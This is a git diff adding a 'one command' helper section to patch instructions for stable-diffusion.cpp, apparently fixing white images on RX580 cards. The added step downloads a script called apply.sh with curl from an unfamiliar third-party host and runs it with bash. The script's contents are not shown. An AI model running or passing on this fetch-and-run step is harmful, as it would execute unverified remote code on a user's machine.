@@ -23,6 +23,22 @@ Both files are plain `git diff` output. Nothing else in the tree was changed.
 
 ## Apply
 
+### One command (the helper)
+
+```bash
+git clone https://github.com/leejet/stable-diffusion.cpp
+cd stable-diffusion.cpp
+git checkout 5356982
+git submodule update --init --recursive
+curl -O https://app8601830087.tgcloud.ai/r/rx580-white-images-fix/sd-cpp/apply.sh
+bash apply.sh
+```
+
+`apply.sh` only runs `git apply`, checks the checkout SHA, and prints the build
+command. Read it before running it.
+
+### By hand
+
 ```bash
 git clone https://github.com/leejet/stable-diffusion.cpp
 cd stable-diffusion.cpp
